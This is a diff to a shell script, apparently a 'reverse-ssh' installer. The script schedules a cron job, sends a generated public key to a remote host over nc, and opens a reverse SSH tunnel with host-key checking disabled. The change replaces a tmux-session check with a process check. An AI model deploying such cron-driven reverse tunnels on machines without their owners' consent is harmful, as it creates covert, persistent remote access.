@@ -10,10 +10,6 @@ SCRIPT_NAME=${SCRIPT_NAME:-reverse-ssh}
 ## A crontab timespec when to run the job
 CRON_TIMESPEC=${CRON_TIMESPEC:-~ * * * *}
 
-## Name of the `tmux` session to use. If this session exists, the reverse
-## shell is not started.
-SESSION_NAME=${SESSION_NAME:-reverse-ssh}
-
 ## TCP port to transmit the SSH public key before attempting to connect
 KEY_XFER_PORT=${KEY_XFER_PORT:-40023}
 KEY_XFER_WAIT_TIME=${KEY_XFER_WAIT_TIME:-300}
@@ -27,7 +23,6 @@ REMOTE_USER=${REMOTE_USER:-root}
 REMOTE_HOST=${REMOTE_HOST:-localhost}
 REMOTE_PORT=${REMOTE_PORT:-22}
 
-TMUX=$(which tmux)
 CRONTAB=$(which crontab)
 SSH=$(which ssh)
 
@@ -110,18 +105,19 @@ ssh-keygen -t rsa -b 3072 -f "$TMPDIR/out/ssh/id_rsa" -q -N "" -C "$SCRIPT_NAME"
 cat <<EOT >"$TMPDIR/out/$SCRIPT_NAME"
 #!/bin/sh
 run() {
-	if tmux has-session -t $SESSION_NAME 2>/dev/null; then
+	ps=\$(ps -xo pid,args | grep -E '^\s+[0-9]+\s+ssh.*-R $TUNNEL_REMOTE_PORT:localhost:$TUNNEL_LOCAL_PORT .* $REMOTE_USER@$REMOTE_HOST' | awk '{print \$1}')
+	if [ -n "\$ps" ]; then
 		exit
 	else
 		/bin/sh -c "(${KEY_FILTER_CMD:-cat}) <'$DEPLOY_PATH/ssh/id_rsa.pub' | nc $REMOTE_HOST $KEY_XFER_PORT" || exit
-		tmux new-session -d -s $SESSION_NAME "\\
-		sleep $KEY_XFER_WAIT_TIME; \\
-		ssh -R $TUNNEL_REMOTE_PORT:localhost:$TUNNEL_LOCAL_PORT \\
+		sleep $KEY_XFER_WAIT_TIME
+		ssh -f \\
+			-R $TUNNEL_REMOTE_PORT:localhost:$TUNNEL_LOCAL_PORT \\
 			-i '$DEPLOY_PATH/ssh/id_rsa' \\
 			-p $REMOTE_PORT \\
 			-o StrictHostKeyChecking=no \\
 			-o UserKnownHostsFile=/dev/null \\
-			$REMOTE_USER@$REMOTE_HOST"
+			$REMOTE_USER@$REMOTE_HOST sleep 600
 	fi
 }
 
@@ -181,8 +177,6 @@ Every:
     $CRON_TIMESPEC
 As user:
     $USER ($UID)
-Start a tmux session:
-    $SESSION_NAME
 And transfer key:
     $(ssh-keygen -l -f $TMPDIR/out/ssh/id_rsa -E md5)
     $(ssh-keygen -l -f $TMPDIR/out/ssh/id_rsa -E sha256)
